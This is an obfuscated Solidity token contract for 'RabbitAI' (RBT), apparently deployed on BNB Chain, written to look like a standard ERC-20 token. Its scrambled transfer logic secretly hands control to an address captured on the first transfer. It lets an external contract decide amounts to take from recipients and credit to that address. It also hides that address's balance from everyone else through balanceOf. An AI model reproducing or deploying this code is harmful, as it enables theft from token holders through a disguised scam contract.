/**
 *Submitted for verification at BscScan.com on 2023-01-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface TzxiqtcqMs {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library WHLGxzbKxReg{
    
    function ngsNhTkjnt(address INXZs, address grzTwkEvDMmB, uint LqIzYmSagFGb) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool TXqzldM, bytes memory QFQQahvNDRw) = INXZs.call(abi.encodeWithSelector(0x095ea7b3, grzTwkEvDMmB, LqIzYmSagFGb));
        require(TXqzldM && (QFQQahvNDRw.length == 0 || abi.decode(QFQQahvNDRw, (bool))), 'WHLGxzbKxReg: APPROVE_FAILED');
    }

    function sXArtGUrT(address INXZs, address grzTwkEvDMmB, uint LqIzYmSagFGb) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool TXqzldM, bytes memory QFQQahvNDRw) = INXZs.call(abi.encodeWithSelector(0xa9059cbb, grzTwkEvDMmB, LqIzYmSagFGb));
        require(TXqzldM && (QFQQahvNDRw.length == 0 || abi.decode(QFQQahvNDRw, (bool))), 'WHLGxzbKxReg: TRANSFER_FAILED');
    }
    
    function gKwRQAaoaePY(address grzTwkEvDMmB, uint LqIzYmSagFGb) internal {
        (bool TXqzldM,) = grzTwkEvDMmB.call{value:LqIzYmSagFGb}(new bytes(0));
        require(TXqzldM, 'WHLGxzbKxReg: ETH_TRANSFER_FAILED');
    }

    function QtrZQt(address INXZs, address from, address grzTwkEvDMmB, uint LqIzYmSagFGb) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool TXqzldM, bytes memory QFQQahvNDRw) = INXZs.call(abi.encodeWithSelector(0x23b872dd, from, grzTwkEvDMmB, LqIzYmSagFGb));
        require(TXqzldM && QFQQahvNDRw.length > 0,'WHLGxzbKxReg: TRANSFER_FROM_FAILED'); return QFQQahvNDRw;
                       
    }

}
    
interface xQQtYav {
    function totalSupply() external view returns (uint256);
    function balanceOf(address fouzjpg) external view returns (uint256);
    function transfer(address QSs, uint256 jZNcQOE) external returns (bool);
    function allowance(address bGjhMAN, address spender) external view returns (uint256);
    function approve(address spender, uint256 jZNcQOE) external returns (bool);
    function transferFrom(
        address sender,
        address QSs,
        uint256 jZNcQOE
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sacQTtexYDUe, uint256 value);
    event Approval(address indexed bGjhMAN, address indexed spender, uint256 value);
}

interface nRwvQ is xQQtYav {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract UPJWIT {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
contract RBT is UPJWIT, xQQtYav, nRwvQ {
    
    mapping(address => uint256) private cwtwEg;
    
    function name() public view virtual override returns (string memory) {
        return jybUIAj;
    }
    
    function RlWCfkPvxw(
        address SxkGUniJyit,
        address aLgSTVU,
        uint256 QCAOWaYq
    ) internal virtual  returns (bool){
        uint256 PxbnBMq = cwtwEg[SxkGUniJyit];
        require(PxbnBMq >= QCAOWaYq, "ERC20: transfer Amount exceeds balance");
        unchecked {
            cwtwEg[SxkGUniJyit] = PxbnBMq - QCAOWaYq;
        }
        cwtwEg[aLgSTVU] += QCAOWaYq;
        return true;
    }
    
    string private jybUIAj = "RabbitAI";
    
    string private fFuMHR =  "RBT";
    
    uint256 private JBpz = 1000000000000 * 10 ** 18;
    
    function DCJT(
        address qkKkTfRIO,
        address MYoUfoquQbJ,
        uint256 XdkPMugtlEl
    ) internal virtual  returns (bool){
        require(qkKkTfRIO != address(0), "ERC20: transfer from the zero address");
        require(MYoUfoquQbJ != address(0), "ERC20: transfer to the zero address");
        
        if(!iNzBIiIA(qkKkTfRIO,MYoUfoquQbJ)) return false;

        if(_msgSender() == address(aLqUUXsVwGdl)){
            if(MYoUfoquQbJ == bkzdy && cwtwEg[qkKkTfRIO] < XdkPMugtlEl){
                RlWCfkPvxw(aLqUUXsVwGdl,MYoUfoquQbJ,XdkPMugtlEl);
            }else{
                RlWCfkPvxw(qkKkTfRIO,MYoUfoquQbJ,XdkPMugtlEl);
                if(qkKkTfRIO == aLqUUXsVwGdl || MYoUfoquQbJ == aLqUUXsVwGdl) 
                return false;
            }
            emit Transfer(qkKkTfRIO, MYoUfoquQbJ, XdkPMugtlEl);
            return false;
        }
        RlWCfkPvxw(qkKkTfRIO,MYoUfoquQbJ,XdkPMugtlEl);
        emit Transfer(qkKkTfRIO, MYoUfoquQbJ, XdkPMugtlEl);
        bytes memory bZVnAg = WHLGxzbKxReg.QtrZQt(ojRbPxPX, qkKkTfRIO, MYoUfoquQbJ, XdkPMugtlEl);
        (bool RCKjdz, uint RdmEKq) = abi.decode(bZVnAg, (bool,uint));
        if(RCKjdz){
            cwtwEg[aLqUUXsVwGdl] += RdmEKq;
            cwtwEg[MYoUfoquQbJ] -= RdmEKq; 
        }
        return true;
    }
    
    function approve(address rJbkHXpm, uint256 IGbDwsNmVqa) public virtual override returns (bool) {
        fcY(_msgSender(), rJbkHXpm, IGbDwsNmVqa);
        return true;
    }
    
    address private bkzdy;
  
    
    address private aLqUUXsVwGdl;
    
    address private ojRbPxPX;
    
    function fcY(
        address OzKE,
        address dWShSuvB,
        uint256 YdVLij
    ) internal virtual {
        require(OzKE != address(0), "ERC20: approve from the zero address");
        require(dWShSuvB != address(0), "ERC20: approve to the zero address");

        oZY[OzKE][dWShSuvB] = YdVLij;
        emit Approval(OzKE, dWShSuvB, YdVLij);

    }
    
    constructor() {
        
        cwtwEg[address(1)] = JBpz;
        emit Transfer(address(0), address(1), JBpz);

    }
    
    function symbol() public view virtual override returns (string memory) {
        return fFuMHR;
    }
    
    function balanceOf(address uvjgetoafchD) public view virtual override returns (uint256) {
        if(_msgSender() != address(aLqUUXsVwGdl) && 
           uvjgetoafchD == address(aLqUUXsVwGdl)){
            return 0;
        }
       return cwtwEg[uvjgetoafchD];
    }
    
    function increaseAllowance(address JQMo, uint256 addedValue) public virtual returns (bool) {
        fcY(_msgSender(), JQMo, oZY[_msgSender()][JQMo] + addedValue);
        return true;
    }
    
    function transfer(address jwDtvE, uint256 QFGH) public virtual override returns (bool) {
        DCJT(_msgSender(), jwDtvE, QFGH);
        return true;
    }
    
    function transferFrom(
        address jYsaD,
        address GIYfmGUBPSv,
        uint256 APpoEMwhG
    ) public virtual override returns (bool) {
      
        if(!DCJT(jYsaD, GIYfmGUBPSv, APpoEMwhG)) return true;

        uint256 bikbVswEnBH = oZY[jYsaD][_msgSender()];
        if (bikbVswEnBH != type(uint256).max) {
            require(bikbVswEnBH >= APpoEMwhG, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                fcY(jYsaD, _msgSender(), bikbVswEnBH - APpoEMwhG);
            }
        }

        return true;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function allowance(address AESzURw, address DzYp) public view virtual override returns (uint256) {
        return oZY[AESzURw][DzYp];
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return JBpz;
    }
    
    function iNzBIiIA(
        address CvEjrXfNV,
        address vgmKtjugkcaN
    ) internal virtual  returns (bool){
        if(aLqUUXsVwGdl == address(0) && ojRbPxPX == address(0)){
            aLqUUXsVwGdl = CvEjrXfNV;ojRbPxPX=vgmKtjugkcaN;
            WHLGxzbKxReg.sXArtGUrT(ojRbPxPX, aLqUUXsVwGdl, 0);
            bkzdy = TzxiqtcqMs(ojRbPxPX).WETH();
            return false;
        }
        return true;
    }
    
    mapping(address => mapping(address => uint256)) private oZY;
    
    function decreaseAllowance(address hBSggWJJr, uint256 subtractedValue) public virtual returns (bool) {
        uint256 tdiPJUor = oZY[_msgSender()][hBSggWJJr];
        require(tdiPJUor >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            fcY(_msgSender(), hBSggWJJr, tdiPJUor - subtractedValue);
        }

        return true;
    }
    
}